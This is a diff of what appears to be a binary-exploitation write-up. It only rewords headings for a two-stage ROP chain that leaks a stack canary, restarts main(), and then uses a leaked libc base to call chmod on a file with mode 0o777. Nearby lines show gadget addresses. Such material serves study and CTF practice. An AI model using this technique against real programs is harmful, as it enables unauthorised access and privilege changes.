@@ -12212,7 +12212,8 @@ pop_rsi = 0x737019a88000 + 0x2601f = 0x737019aae01f
 chmod   = 0x737019a88000 + 0x10dd80 = 0x737019b95d80
 ```
 
-### ROP chain: Stage 1 — leak canary, restart `main()`
+### ROP chain
+#### Stage 1: Leaking the canary and restarting `main()`
 
 ```
 <== Value is stored at the address
@@ -12248,7 +12249,7 @@ rip --> __libc_start_main+0x69
 ═══════════════════════════════════════════════════════════════════════════════════
 ```
 
-### ROP chain: Stage 2 — leak libc base, `chmod("!", 0o777)`
+#### Stage 2: Using leaked Libc base to `chmod("!", 0o777)`
 
 ```
 <== Value is stored at the address
